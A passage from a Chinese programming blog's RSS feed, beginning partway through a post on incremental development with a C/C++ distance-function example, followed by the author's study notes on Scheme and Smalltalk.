    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dsquared is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在这个阶段可以再一次编译和运行程序，检查中间值是否正确&lt;/p&gt;
&lt;h3&gt;4.5&lt;/h3&gt;
&lt;p&gt;最后，用sqrt函数计算平方根，并返回结果&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;至此，主要的工作就完成了。&lt;/p&gt;
&lt;h3&gt;4.6&lt;/h3&gt;
&lt;p&gt;在main函数中，检查结果&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;math.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;6.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dict&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;熟练之后，一次可以编写和调试更多的行。&lt;/p&gt;
&lt;p&gt;总结下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从一个可以运行的程序开始，做小步，渐进的改进。在任何一点，如果出错，可以清楚地知道错误发生的地方&lt;/li&gt;
&lt;li&gt;使用临时变量存储中间结果，便于输出和检查。&lt;/li&gt;
&lt;li&gt;一旦程序正常运行，可能需要移除部分支架代码。记得加上注释使程序保持可读性。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外可以结合git来管理代码，将没有问题的代码入库，保证代码安全的同时，可以随时切换到任意时间点。这样在渐进前进的同时就可以无所顾忌了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 04 Jun 2015 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2015-06-04:about-incremental-development.html</guid><category>code</category></item><item><title>Scheme学习笔记</title><link>/learn-Scheme.html</link><description>&lt;p&gt;大学时读了不少函数式的资料，十分喜欢函数式的风格。&lt;br /&gt;
前段时间比较认真地学了一下Scheme。&lt;br /&gt;
尽管我们在实际项目中很少会用到Scheme，但学习Scheme有助于写出更高质量函数。就像学习Smalltalk有助于理解对象。&lt;br /&gt;
Scheme和Smalltalk是我见过最纯粹优美的两门语言。&lt;br /&gt;
说说学习Scheme中的一些心得体会：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表达你的意图，而不是操作过程，这样有助于我们能站在更高的抽象层面上&lt;/li&gt;
&lt;li&gt;尽量不要副作用，函数主要目的是返回(return)一个值。这样可以保证函树能更容易被当作黑箱，就是说有更好的抽象性&lt;/li&gt;
&lt;li&gt;for-loops表达的是过程，map,reduce,filter(sorted,groupby)隐含循环，语义上却在表达意图&lt;/li&gt;
&lt;li&gt;表达出你的意图能提高代码可读性&lt;/li&gt;
&lt;li&gt;在自己的定义中调用自己的函数叫做递归函数. &lt;/li&gt;
&lt;li&gt;现实中很多任务是递归的，重复某个动作，符合条件退出。这是普适性很强的抽象模型&lt;/li&gt;
&lt;li&gt;以下内容有助于你理解递归：你可能需要去阅读你正在阅读的文献所引用的文献。进一步，你可能还需要去阅读文件所引用的其它文献。这样，文献调研就是一个递归的过程，你也可以重复这个调研过程直到满足了特定条件&lt;/li&gt;
&lt;li&gt;递归耗内存的原因是开销大的原因在于过程没有被计算。一直存在内存中。尾递归的本质是用某个内存空间来收集计算的结果，而不必一直存在内存中&lt;/li&gt;
&lt;li&gt;cons 负责把每个结果串起来。大脑的内存不很大，我们能应付的复杂度很有限。所以每次不要走太远，每次只处理当前一步，思考后续一致，用递归的方式思考。  使用抽象来描述，不要把所有过程加载到大脑&lt;/li&gt;
&lt;li&gt;命名递归变量很重要，表达出意图&lt;/li&gt;
&lt;li&gt;lambda表达式的参数仅在函数定义内部有效。let只是lambda的语法糖，因此二者无异。对于语义的表达有帮助的话，语法糖就是良好的&lt;/li&gt;
&lt;li&gt;lambda表达式用于定义函数，它为变量建立了一个作用域，变量的作用域被限定在了源码中定义其的那个括号里&lt;/li&gt;
&lt;li&gt;闭包能记住内部状态，因此可以用来模拟对象&lt;/li&gt;
&lt;li&gt;赋值改变了参数的值，具有破坏性，当万不得已时才使用赋值&lt;/li&gt;
&lt;li&gt;Scheme并没有定义块结构的语法，因此使用lambda表达式作为一个块&lt;/li&gt;
&lt;li&gt;高阶函数是一种以函数为参数的函数。它们都被用于映射（mapping）、过滤（filtering）、归档（folding）和排序（sorting）表。高阶函数提高了程序的模块性。使用一个高阶函数来实现排序可以使得我们使用不同的条件来排序，这就将排序条件和排序过程清楚地划分开来。很容易写函数来实现插拔。&lt;/li&gt;
&lt;li&gt;Scheme中代码即数据，因此你可以通过将函数当作参数传递轻松的定义自己的高阶函数。&lt;/li&gt;
&lt;li&gt;你可以通过“程序”来写程序&lt;/li&gt;
&lt;li&gt;lisp中所有东西都是数据  代码也是 虚虚实实 惰性求值变得容易 。&lt;/li&gt;
&lt;li&gt;字符是个比较关键的概念，代码本身只是文本而已。Lisp语言的最初目的就是符号处理，在Scheme语言中几乎所有的东西都可以看做是符号或做为符号列表来处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://deathking.github.io/yast-cn/"&gt;Scheme入门教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/heros/archive/2009/11/30/1614111.html"&gt;Scheme简明教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ibm.com/search/csass/search/?q=Scheme&amp;amp;sn=dw&amp;amp;lang=zh&amp;amp;cc=CN&amp;amp;en=utf&amp;amp;hpp=20&amp;amp;dws=cndw&amp;amp;lo=zh"&gt;ibm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2014-09-03:learn-Scheme.html</guid></item><item><title>Smalltalk学习笔记</title><link>/learn-Smalltalk.html</link><description>&lt;ul&gt;
&lt;li&gt;所有一切都是物体（Everything is an Object）。这是Smalltalk中最重要的一条规则。&lt;/li&gt;
&lt;li&gt;一个变量没有与之关联的类型。变量仅仅指向物体&lt;/li&gt;
&lt;li&gt;a := 2的真正含义不是“将a的值设置为整数2”，而是“让变量a指向一个值为2的SmallInteger(小整数)物体”&lt;/li&gt;
&lt;li&gt;所有的计算都通过消息（message）来触发。你向某个物体发送消息，然后就会发生某些事情。&lt;/li&gt;
&lt;li&gt;(15 * 19) + (37 squared)可以理解为：向15发送消息 * ，参数为19；向37发送消息squared；最后向15*19的结果发送消息 + ，参数为37 squared的结果。&lt;/li&gt;
&lt;li&gt;Smalltalk中所有的表达式都是&amp;lt;接受消息的物体&amp;gt; &amp;lt;消息&amp;gt;&lt;/li&gt;
&lt;li&gt;消息激发方法。一个消息会对应什么方法是由接受消息的物体决定的。&lt;/li&gt;
&lt;li&gt;每条消息（to: do:, whileTrue:, +）都会激发方法，这些方法是Smalltalk中的代码单元，你可以认为方法就是你常用的编程语言中的函数或者过程。方法是计算发生的地方。。你不仅可以查看它们的控制结构和操作是如何实现的——而且还能改动它们！&lt;/li&gt;
&lt;li&gt;每一个物体都是某类事物的一个实例。&lt;/li&gt;
&lt;li&gt;由于该类（事物）中定义了此实例（物体）的行为，所以必须找到这个接受消息的物体所属于的类，然后通过类来指出应该如何解释收到的消息。这一点非常重要。  (代码的位置，高层和底层视角的切换 很微妙)&lt;/li&gt;
&lt;li&gt;类是定义方法（行为）的地方，决定了物体是否有某种能力（能执行某个动作），所有代码都能在类中找到,没有魔术&lt;/li&gt;
&lt;li&gt;Smalltalk中没有什么要记住的关键字（甚至没有if，你可以自己实现）！使用Smalltalk，就像用小积木，能让你搭建出你想要的任何东西。&lt;/li&gt;
&lt;li&gt;在Smalltalk语言中没有条件语句，取而代之的是一些发送给对象true或者false的消息，因此它们不属于语言部分，而属于Smalltalk的类库；也没有循环重复语句（C语言中的for, while），Smalltalk用向数字对象或块对象发送消息来实现重复执行。&lt;/li&gt;
&lt;li&gt;语言没有固定的语法，语法分析由类本身完成&lt;/li&gt;
&lt;li&gt;Smalltalk是一种使用“晚绑定（late-binding”的语言，让相同的消息在不同的数据上执行近似的功能成为多态。当你看到一个printString消息时，你实际上并不知道将会执行什么，直到你了解这个消息被发送给哪个物体后，才能清楚到底会执行什么内容&lt;/li&gt;
&lt;li&gt;从smalltalk这里学习对象，从lisp那里学习函数&lt;/li&gt;
&lt;li&gt;面向对象编程的精髓在于将行为绑定在数据上&lt;/li&gt;
&lt;li&gt;在结构化程序设计之中，我们将精力集中在行为（动词）上，然后弄清楚我们需要哪些数据（名词）才能执行。总而言之，我们将数据绑定在行为上。但在面向对象程序设计之中，我们将程序的中心用名词和数据表示，然后弄清楚我们要将哪些行为绑定在他们之上&lt;/li&gt;
&lt;li&gt;Smalltalk和Scheme都非常优美纯粹，一致性非常好，相比之下，主流工业语言有些大杂烩，不少由于妥协导致的不一致，以及难以理解&lt;/li&gt;
&lt;li&gt;严格遵照一个唯一标准机制的做法已经被证明具有惊人的威力&lt;/li&gt;
&lt;li&gt;学习纯粹的语言，能让你更容易搞懂核心概念，而不会被各种枝节分神，而这些概念是大多编程语言的核心&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wikipedia.org/wiki/Smalltalk"&gt;Smalltalk wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://developer.51cto.com/art/201109/291681.htm"&gt;Smalltalk为什么让我爱不释手&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.sina.com.cn/s/blog_7d553bb501013w7d.html"&gt;Smalltalk的基本规则&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2014-09-03:learn-Smalltalk.html</guid></item></channel></rss>